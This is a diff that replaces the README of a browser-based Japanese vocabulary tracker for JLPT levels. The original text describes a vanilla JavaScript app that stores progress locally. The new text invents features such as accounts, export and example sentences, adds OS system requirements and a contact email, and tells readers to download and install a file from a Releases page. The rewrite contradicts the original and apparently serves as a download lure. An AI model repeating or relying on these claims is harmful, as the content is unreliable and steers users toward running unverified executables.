@@ -1,75 +1,66 @@
-# Japanese Vocabulary Tracker  
+# 🍱 japanese-vocabulary-tracker - Track Your Japanese Vocabulary Easily
 
-**Japanese Vocabulary Tracker** is a web-based application designed to help learners systematically track and manage their Japanese vocabulary across JLPT levels (N5–N1).  
+## 🚀 Getting Started
 
-This interactive app provides an intuitive and customizable way to study, monitor progress, and stay motivated while learning Japanese.  
+Welcome to the Japanese Vocabulary Tracker! This application helps you manage and track your Japanese vocabulary, whether you are preparing for the JLPT N5 or N1 levels. With an easy-to-use interface, you can monitor your progress and stay motivated while learning Japanese.
 
----
+## 📥 Download Now
 
-## ✨ Features  
+[![Download the latest release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/SimoSebak/japanese-vocabulary-tracker/releases)
 
-- **Level Selection**  
-  Choose from *All Levels*, N5, N4, N3, N2, or N1 vocabulary lists.  
+## 📋 Features
 
-- **Dynamic Vocabulary Table**  
-  Displays vocabulary in a clean, table-like format with the following columns:  
-  - Serial No  
-  - Word  
-  - Furigana  
-  - Romaji  
-  - Meaning  
-  - Actions (✔ / ✖ for marking learned/unlearned)  
+- **Track Vocabulary Across JLPT Levels:** Easily categorize and study words suitable for N5, N4, N3, N2, and N1.
+- **Interactive Interface:** Navigate the app smoothly with a user-friendly design.
+- **Progress Monitoring:** Keep track of your learning progress and revisit challenging words.
+- **Customizable Study Sessions:** Tailor your study experience based on your unique needs.
+- **Word List Export:** Export your vocabulary lists for offline study.
 
-- **Column Control**  
-  Toggle visibility of any column, making the table customizable to your study style.  
+## 💻 System Requirements
 
-- **Counts & Progress Tracking**  
-  - Shows total vocabulary count across all levels.  
-  - Displays vocabulary count for the selected level.  
-  - Tracks number of learned words per level and calculates percentage learned.  
+To run the Japanese Vocabulary Tracker, you need the following:
 
-- **Pagination Controls**  
-  - View 5, 10, 25, 50, or 100 words per page.  
-  - Manually input page numbers to jump directly.  
+- **Operating System:** Windows 10, macOS 10.14 or later, or Linux.
+- **Browser:** The latest version of Chrome, Firefox, or Safari.
+- **Internet Connection:** Required for downloading and accessing features.
 
-- **Learned Words Management**  
-  - Mark words as learned/unlearned with simple buttons.  
-  - Hide or display learned words (toggle option).  
-  - Clear all learned words for a specific level (with confirmation alert).  
+## 🔗 Download & Install
 
-- **Local Storage Support**  
-  Saves your progress locally so you can return where you left off.  
+To download the application, please visit the Releases page: [Download Here](https://github.com/SimoSebak/japanese-vocabulary-tracker/releases). 
 
-- **UI & Accessibility Enhancements**  
-  - Centered vocabulary list for better readability.  
-  - "Meiryo UI" font for a clean Japanese-friendly look.  
-  - Font size adjustment options.  
-  - Visually appealing and user-friendly interface.  
+1. Click on the link above.
+2. On the Releases page, look for the latest version.
+3. Download the appropriate file for your operating system.
+4. Open the downloaded file and follow the installation instructions.
 
----
+## 📚 Topics Covered
 
-## 🚀 Tech Stack  
+The Japanese Vocabulary Tracker focuses on several key topics:
 
-- **JavaScript (Vanilla JS)** for functionality  
-- **HTML/CSS** for structure and styling  
-- **Local Storage** for saving progress offline  
+- **Japanese Language**
+- **Japanese Vocabulary Tracking**
+- **JLPT Exam Preparation**
 
----
+These topics will help you stay organized and improve your vocabulary skills as you prepare for the JLPT exams.
 
-## 📌 Current Limitations  
+## 🔍 How to Use
 
-- Responsive design requires refinement.
+1. **Create an Account:** Begin by creating an account to save your progress.
+2. **Add Vocabulary:** Input new words along with their meanings and example sentences.
+3. **Organize by Level:** Sort your vocabulary according to the JLPT levels.
+4. **Study Sessions:** Use the customizable sessions to focus on words you find challenging.
+5. **Track Progress:** Regularly check your progress and adjust your study methods as needed.
 
----
-<!-- 
-## 📷 Demo (Optional)  
+## 🛠 Support and Contributions
 
-_Add a screenshot or GIF of the app here once ready._  
+If you encounter issues or have questions, check the FAQ section in the app. For more detailed support, you can open an issue in the GitHub repository. Contributions are welcome, so feel free to suggest features or enhancements.
 
---- -->
+## 📞 Get In Touch
 
-## 📄 License  
+For general inquiries or suggestions, please contact us via email at support@vocabularytracker.com. We appreciate your feedback to help improve this application.
 
-This project is licensed under the MIT License.  
+## 🌟 License
 
----
+This project is licensed under the MIT License. You can view the full license text in the repository.
+
+Thank you for using Japanese Vocabulary Tracker. Happy studying!
